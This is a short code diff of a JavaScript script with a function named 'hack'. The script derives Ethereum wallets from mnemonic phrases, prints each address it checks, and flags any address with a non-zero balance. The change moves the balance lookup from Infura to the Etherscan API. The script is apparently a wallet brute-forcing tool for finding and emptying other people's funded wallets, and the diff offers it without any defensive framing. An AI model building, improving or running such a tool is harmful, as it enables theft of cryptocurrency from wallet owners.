@@ -2,7 +2,7 @@ const eth = require('ethers');
 const Web3 = require('web3');
 const hdkey = require('ethereumjs-wallet');
 const bip39 = require('bip39');
-const web3 = new Web3('https://mainnet.infura.io/v3/*Your infura key*');
+var api = require('etherscan-api').init('*Your Etherscan Key*');
 
 async function hack () {
     const path = "m/44'/60'/0'/0/0";
@@ -18,7 +18,7 @@ async function hack () {
         hdwallet = hdkey.hdkey.fromMasterSeed(bip39.mnemonicToSeedSync(mnemonicPhrase));
         wallet = hdwallet.derivePath(path).getWallet();
         address = `0x${wallet.getAddress().toString('hex')}`;
-        balance = await web3.eth.getBalance(address);
+        balance = await api.account.balance(address);
         process.stdout.cursorTo(0);
         process.stdout.write(`Checking: ${address}`);
         if(balance > 0) {
